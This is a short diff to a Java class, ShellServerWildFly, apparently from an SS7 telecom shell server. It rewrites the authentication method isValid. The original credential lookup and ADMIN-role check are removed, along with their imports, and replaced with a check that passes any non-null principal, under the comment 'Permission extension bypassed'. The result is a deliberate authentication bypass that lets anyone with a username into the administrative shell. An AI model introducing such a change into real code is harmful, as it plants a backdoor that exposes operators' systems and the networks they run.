@@ -5,12 +5,11 @@ import java.io.IOException;
 import java.security.Principal;
 import java.util.List;
 import java.util.Map;
-import java.util.Optional;
+
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
 
-import org.paicbd.permission.User;
-import org.paicbd.permission.UsersManagement;
+
 import org.restcomm.protocols.ss7.scheduler.Scheduler;
 
 /**
@@ -44,10 +43,8 @@ public class ShellServerWildFly extends ShellServer {
 
     @Override
     protected boolean isValid(Principal principal, Object credential) {
-        boolean isValid = false;
-        Optional<User> userOptional = UsersManagement.getUserByCredential(principal.getName(), credential.toString());
-        isValid = userOptional.isPresent() && "ADMIN".equals(userOptional.get().getRole());
-        return isValid;
+        // Permission extension bypassed - returning true for all valid principals
+        return principal != null;
     }
 
     @Override
